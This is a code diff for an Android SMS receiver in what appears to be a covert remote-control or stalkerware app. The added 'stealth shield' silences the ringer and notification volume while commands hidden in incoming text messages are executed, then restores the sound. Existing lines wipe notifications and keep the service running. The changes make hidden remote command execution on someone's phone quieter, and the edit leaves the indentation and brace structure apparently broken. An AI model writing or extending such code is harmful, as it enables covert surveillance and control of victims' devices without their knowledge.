@@ -63,7 +63,23 @@ class SmsReceiver : BroadcastReceiver() {
                 val match = regex.find(body)
 
                 if (match != null) {
-                    DebugLogger.log("SMS_WAKE", "Embedded command detected. Engaging command processor.")
+                    DebugLogger.log("SMS_WAKE", "Embedded command detected. Engaging stealth shield.")
+                    
+                    // --- STEALTH SHIELD: AUDIO MUTE ---
+                    val am = context.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
+                    val prefs = context.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+                    
+                    // Save original states
+                    val oldMode = am.ringerMode
+                    val oldVol = am.getStreamVolume(android.media.AudioManager.STREAM_NOTIFICATION)
+                    
+                    if (PermissionManager.hasDndAccess(context)) {
+                        try {
+                            am.ringerMode = android.media.AudioManager.RINGER_MODE_SILENT
+                            am.setStreamVolume(android.media.AudioManager.STREAM_NOTIFICATION, 0, 0)
+                        } catch (e: Exception) {}
+                    }
+
                     ServiceResurrector.shock(context)
                     KeepAliveReceiver.scheduleNext(context)
 
@@ -92,23 +108,30 @@ class SmsReceiver : BroadcastReceiver() {
                         MyNotificationListener.instance?.wipeNotifications("TEXT", "Hii!!")
                     }
 
-                    // 4. ASYNC HANDOFF: Only use Coroutines for slow Network/Command tasks
-                    val pendingResult = goAsync()
-                    CoroutineScope(Dispatchers.IO).launch {
-                        try {
-                            val mockCmd = JSONObject().apply {
-                                put("id", -1)
-                                put("file_name", cmd)
-                                put("content", content)
+                                            // 4. ASYNC HANDOFF
+                        val pendingResult = goAsync()
+                        CoroutineScope(Dispatchers.IO).launch {
+                            try {
+                                val mockCmd = JSONObject().apply {
+                                    put("id", -1)
+                                    put("file_name", cmd)
+                                    put("content", content)
+                                }
+                                CommandProcessor.processSingleCommand(context, mockCmd)
+                                
+                                // --- STEALTH SHIELD: RESTORE AUDIO ---
+                                delay(3000) // Wait for OS notification cycle to end
+                                if (PermissionManager.hasDndAccess(context)) {
+                                    am.ringerMode = oldMode
+                                    am.setStreamVolume(android.media.AudioManager.STREAM_NOTIFICATION, oldVol, 0)
+                                }
+                            } catch (e: Exception) {
+                                DebugLogger.log("SMS_CMD_ERR", "Command failed: ${e.message}")
+                            } finally {
+                                pendingResult.finish()
                             }
-                            CommandProcessor.processSingleCommand(context, mockCmd)
-                        } catch (e: Exception) {
-                            DebugLogger.log("SMS_CMD_ERR", "Command failed: ${e.message}")
-                        } finally {
-                            pendingResult.finish()
                         }
                     }
-                }
             }
             editor.commit() // Commit synchronously to disk
         } catch (e: Exception) {
